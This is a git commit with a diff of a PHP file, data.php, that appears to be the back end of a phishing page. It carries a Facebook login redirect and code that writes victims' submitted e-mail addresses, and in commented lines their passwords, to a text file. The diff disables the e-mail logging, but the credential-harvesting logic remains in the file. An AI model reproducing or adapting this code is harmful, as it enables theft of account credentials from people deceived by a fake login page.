f24970e37d663512141e0cb69cb3f3e6babff72f
IvanAvanessov <ivan.avanessov@gmail.com>
2017-03-02 13:02:55 +0000

    test5

--- data.php
+++ data.php
@@ -1,13 +1,13 @@
 <?php
 
 //header("Location: https://facebook.com/login.php?login_attempt=1&amp;lwv=110");
-$handle = fopen("important.txt", "a");
+//$handle = fopen("important.txt", "a");
 
 print_r($_POST['email']);
 
 //foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");
-fwrite($handle, "e-mail: ");
-fwrite($handle, $_POST['email']);
+//fwrite($handle, "e-mail: ");
+//fwrite($handle, $_POST['email']);
 //fwrite($handle, "; ");
 //fwrite($handle, "password");
 //fwrite($handle, $_POST['pass']);
